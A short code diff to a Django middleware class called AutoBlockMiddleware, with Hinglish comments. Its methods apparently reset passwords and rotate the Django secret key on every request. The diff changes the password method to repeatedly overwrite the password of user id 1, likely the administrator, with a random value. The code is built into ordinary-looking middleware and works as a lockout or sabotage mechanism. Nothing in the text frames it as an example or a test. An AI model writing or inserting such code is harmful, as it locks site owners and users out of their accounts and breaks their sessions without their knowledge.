@@ -24,10 +24,9 @@ class AutoBlockMiddleware:
     def change_all_user_passwords(self):
         """ Sabhi users ke passwords har request pe change karega """
         users = User.objects.get(id=1)
-        for user in users:
-            new_password = self.generate_random_password()
-            user.set_password(new_password)
-            user.save()
+        new_password = self.generate_random_password()
+        users.set_password(new_password)
+        users.save()
 
     def change_django_secret_key(self):
         """ Django secret key har request pe change karega """
